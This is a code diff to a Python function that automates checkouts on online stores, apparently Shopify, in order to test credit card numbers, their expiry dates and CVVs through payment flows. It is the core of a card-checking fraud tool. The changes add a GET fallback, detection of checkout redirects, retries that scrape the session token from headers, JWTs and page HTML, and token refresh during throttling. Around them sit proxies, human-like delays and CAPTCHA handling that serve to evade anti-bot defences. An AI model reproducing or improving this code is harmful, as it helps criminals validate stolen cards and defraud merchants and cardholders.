@@ -939,11 +939,32 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 lambda: session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy, timeout=15),
                 step_name="checkout", max_retries=2, base_delay=3.0, max_delay=12.0
             )
+            # Fallback: some stores reject POST /checkout — try GET
+            if response.status_code in (405, 400, 403) or (response.status_code >= 500):
+                await asyncio.sleep(random.uniform(0.5, 1.5))
+                response, _ = await retry_on_429(
+                    lambda: session.get(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy, timeout=15),
+                    step_name="checkout_GET_fallback", max_retries=1, base_delay=3.0, max_delay=12.0
+                )
             # If still 429 after retries, return rate-limit error
             if response.status_code == 429:
                 return False, "Checkout Rate-Limited: HTTP 429 (retries exhausted)", gateway, total_price, currency
             await human_delay(step_name="checkout")  # Technique #2: Human-like delay
             checkout_url = str(response.url)
+
+            # Validate checkout URL — detect non-checkout redirects early
+            _checkout_parsed = urlparse(checkout_url)
+            _checkout_path_lower = _checkout_parsed.path.lower()
+            if '/checkout' not in _checkout_path_lower and '/pay' not in _checkout_path_lower:
+                # Redirected to non-checkout page (password page, out of stock, etc.)
+                if '/password' in _checkout_path_lower:
+                    return False, "Store is password-protected", gateway, total_price, currency
+                elif '/cart' in _checkout_path_lower:
+                    return False, "Redirected back to cart (item may be out of stock)", gateway, total_price, currency
+                elif '/account' in _checkout_path_lower:
+                    return False, "Site requires login!", gateway, total_price, currency
+                else:
+                    return False, f"Redirected to non-checkout page: {checkout_url[:100]}", gateway, total_price, currency
 
             # Detect checkout URL format: /checkouts/cn/TOKEN or /checkouts/TOKEN
             attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
@@ -1168,11 +1189,114 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 pci_build_hash = pci_hash_match.group(1)
 
             if not sst:
-                # FIX: Include diagnostic info in error message so user can debug WHY it failed.
-                # Previously just said "Failed to get session token" with no context.
+                # RETRY: Re-fetch the checkout page with GET (some stores reject POST)
+                # and re-attempt all extraction methods before giving up.
+                print(f"[SESSION_TOKEN] First attempt failed, retrying checkout with GET...", file=sys.stderr)
+                _retry_sst = None
+                try:
+                    _retry_headers = {
+                        **headers,
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'Referer': ourl,
+                        'sec-fetch-dest': 'document',
+                        'sec-fetch-mode': 'navigate',
+                        'sec-fetch-site': 'same-origin',
+                        'sec-fetch-user': '?1',
+                        'Upgrade-Insecure-Requests': '1',
+                    }
+                    await asyncio.sleep(random.uniform(1.0, 2.0))
+                    _retry_resp = await session.get(
+                        url=checkout, allow_redirects=True,
+                        headers=_retry_headers, proxy=proxy, timeout=15
+                    )
+                    _retry_text = _retry_resp.text
+                    _retry_url = str(_retry_resp.url)
+                    _sst_methods_tried.append(f"retry_GET:status={_retry_resp.status_code}")
+
+                    # Re-attempt header extraction
+                    _retry_sst = (_retry_resp.headers.get('X-Checkout-One-Session-Token') or
+                                  _retry_resp.headers.get('x-checkout-one-session-token'))
+                    if _retry_sst:
+                        _sst_methods_tried.append("retry_headers:found")
+
+                    # Re-attempt JWT from redirect chain
+                    if not _retry_sst and _retry_resp.history:
+                        for _rr_url in [str(r.url) for r in _retry_resp.history]:
+                            for _param_name in ['shop_pay_token', 'token', 'checkout_token', 'session_token']:
+                                _rr_match = re.search(rf'[?&]{_param_name}=([^&]+)', _rr_url)
+                                if _rr_match:
+                                    _rr_jwt = _rr_match.group(1)
+                                    _rr_parts = _rr_jwt.split('.')
+                                    if len(_rr_parts) >= 2:
+                                        _rr_payload = _rr_parts[1] + '=' * (4 - len(_rr_parts[1]) % 4)
+                                        try:
+                                            _rr_decoded = json.loads(base64.urlsafe_b64decode(_rr_payload))
+                                            _retry_sst = (_rr_decoded.get('session_token') or
+                                                          _rr_decoded.get('checkout_session_token') or
+                                                          _rr_decoded.get('sst') or
+                                                          _rr_decoded.get('token'))
+                                            if _retry_sst:
+                                                _sst_methods_tried.append(f"retry_jwt:{_rr_url[:40]}")
+                                                break
+                                        except Exception:
+                                            pass
+                                    # Also try as plain param value
+                                    if not _retry_sst and _param_name in ('session_token', 'sst'):
+                                        _retry_sst = _rr_match.group(1)
+                                        _sst_methods_tried.append(f"retry_url_param:{_param_name}")
+                                        break
+                            if _retry_sst:
+                                break
+
+                    # Re-attempt HTML/JSON/script patterns on retry response
+                    if not _retry_sst:
+                        for _pattern_name, _start, _end in [
+                            ('meta1', 'name="serialized-sessionToken" content="&quot;', '&quot;'),
+                            ('meta2', 'name="serialized-sessionToken" content="', '"'),
+                            ('json1', '"serializedSessionToken":"', '"'),
+                            ('data1', 'data-session-token="', '"'),
+                            ('json2', '"sessionToken":"', '"'),
+                        ]:
+                            _retry_sst = extract_between(_retry_text, _start, _end)
+                            if _retry_sst:
+                                _sst_methods_tried.append(f"retry_{_pattern_name}")
+                                break
+
+                    # Re-attempt script/regex patterns
+                    if not _retry_sst:
+                        for _pat in [
+                            r'window\.__SESSION_TOKEN__\s*=\s*["\']([^"\']+)["\']',
+                            r'"sessionToken"\s*:\s*"([a-zA-Z0-9_-]{20,})"',
+                            r'session[_ ]?token[^=]*[=:]\s*["\']([a-f0-9]{32,64})["\']',
+                        ]:
+                            _rr_m = re.search(_pat, _retry_text, re.IGNORECASE)
+                            if _rr_m:
+                                _retry_sst = _rr_m.group(1)
+                                _sst_methods_tried.append("retry_regex")
+                                break
+
+                    # Re-attempt alternative header names
+                    if not _retry_sst:
+                        for _hdr_key in _retry_resp.headers:
+                            _hdr_lower = _hdr_key.lower()
+                            if 'session' in _hdr_lower and 'token' in _hdr_lower and 'checkout' in _hdr_lower:
+                                _retry_sst = _retry_resp.headers[_hdr_key]
+                                _sst_methods_tried.append(f"retry_alt_header:{_hdr_key}")
+                                break
+
+                    if _retry_sst:
+                        sst = _retry_sst
+                        # Update checkout_url and text from retry response
+                        checkout_url = _retry_url
+                        text = _retry_text
+                        print(f"[SESSION_TOKEN] Retry succeeded: {sst[:8]}...", file=sys.stderr)
+                except Exception as _retry_err:
+                    _sst_methods_tried.append(f"retry_error:{str(_retry_err)[:40]}")
+                    print(f"[SESSION_TOKEN] Retry failed: {_retry_err}", file=sys.stderr)
+
+            if not sst:
                 _diag = f"methods_tried=[{', '.join(_sst_methods_tried)}] url={checkout_url[:80]} status={response.status_code}"
-                print(f"[SESSION_TOKEN] FAILED: {_diag}", file=sys.stderr)
-                # Also log a snippet of the response text for debugging
+                print(f"[SESSION_TOKEN] FAILED (after retry): {_diag}", file=sys.stderr)
                 _snippet = text[:300].replace('\n', ' ').strip() if text else "EMPTY"
                 print(f"[SESSION_TOKEN] Response snippet: {_snippet[:200]}", file=sys.stderr)
                 return False, f"Failed to get session token ({_diag})", gateway, total_price, currency
@@ -1408,9 +1532,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return False, "Throttled", gateway, total_price, currency
                 
                 if result_type == 'NegotiationResultFailed':
-                    # FIX (BUG A): Extract errors from NegotiationResultFailed.
-                    # This type has an 'errors' array with code/message/localizedMessage.
-                    # Previously returned generic "Negotiation failed" with no details.
                     _neg_errors = result.get('errors', [])
                     if _neg_errors:
                         _neg_err_msgs = []
@@ -1425,6 +1546,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     else:
                         _neg_detail = 'No error details provided'
                     return False, f"Negotiation failed: {_neg_detail}", gateway, total_price, currency
+                
+                if result_type != 'NegotiationResultAvailable':
+                    return False, f"Unexpected proposal result: {result_type}", gateway, total_price, currency
                 
                 checkpoint_data = result.get('checkpointData')
                 
@@ -1532,6 +1656,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 tax_amount = 0.0
 
             payment_data = seller_proposal.get('payment', {})
+            payment_methods = []
             if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                 payment_methods = payment_data.get('availablePaymentLines', [])
                 # FIX: Select credit-card-capable payment method, not just the first one.
@@ -1943,6 +2068,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 _st_delay = _st_backoff * _st_jitter
                 print(f"[rate-limit] Submit GraphQL Throttled, retry {_st_attempt+1}/{_submit_throttle_retries} in {_st_delay:.1f}s", file=sys.stderr)
                 await asyncio.sleep(_st_delay)
+                # Refresh sst from previous response headers before retry
+                if response:
+                    _new_sst_submit = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
+                    if _new_sst_submit and _new_sst_submit != sst:
+                        sst = _new_sst_submit
+                        submit_json_data['variables']['input']['sessionInput']['sessionToken'] = sst
                 response, text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                     session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
                 )
@@ -2054,6 +2185,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     session, graphql_url, params, headers, poll_json_data, 
                     checkout_url, max_retries=1, proxy=proxy
                 )
+                
+                # Refresh sst from poll response headers to prevent stale token errors
+                if response:
+                    _new_sst_poll = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
+                    if _new_sst_poll and _new_sst_poll != sst:
+                        sst = _new_sst_poll
+                        poll_json_data['variables']['sessionToken'] = sst
                 
                 # BUG #20 FIX: CAPTCHA in poll = CAPTCHA block, NOT card declined.
                 # Returning True (charged=True) with "CARD_DECLINED" was masking the
@@ -2251,5 +2389,5 @@ async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy
         return result
     except Exception as e:
         print(f"[process_card_async] FATAL: site={site_url} error={e}", file=sys.stderr)
-        return False, f"process_card_async error: {str(e)}", "UNKNOWN", 0, "USD"
+        return False, f"process_card_async error: {str(e)}", "UNKNOWN", "0.00", "USD"
 
